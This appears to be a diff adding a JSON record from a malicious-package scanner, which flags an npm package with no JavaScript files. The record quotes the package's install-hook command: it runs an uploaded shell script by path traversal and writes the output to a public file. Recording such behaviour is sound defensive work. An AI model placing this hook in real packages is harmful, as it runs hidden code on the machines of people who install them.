@@ -1,0 +1,45 @@
+{
+  "package_name": "@aaakca/myf",
+  "version": "1.0.14",
+  "label": "malicious",
+  "behaviors": [
+    {
+      "category": "install_hook",
+      "summary": "The package contains an install hook present in the payload that may execute at install time via the commands listed in the package metadata.",
+      "details": "The install hook commands are: pwd>/tmp/asda;sh../../../public/uploads/1.sh>../../../public/result.txt",
+      "confidence": 0.72,
+      "evidence_apis": [],
+      "evidence_files": [],
+      "evidence_domains": [],
+      "evidence_commands": [
+        "pwd>/tmp/asda;sh../../../public/uploads/1.sh>../../../public/result.txt"
+      ],
+      "evidence_env_vars": []
+    },
+    {
+      "category": "suspicious_behavior",
+      "summary": "Package contains no JavaScript files.",
+      "details": "The package file structure does not contain any JavaScript files.",
+      "confidence": 0.34,
+      "evidence_apis": [],
+      "evidence_files": [],
+      "evidence_domains": [],
+      "evidence_commands": [],
+      "evidence_env_vars": []
+    }
+  ],
+  "risk_vector": [
+    "install_hook",
+    "suspicious_behavior"
+  ],
+  "analyst_note": "",
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "semantic_v2.0",
+    "routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-26T21:51:51.379453"
+}
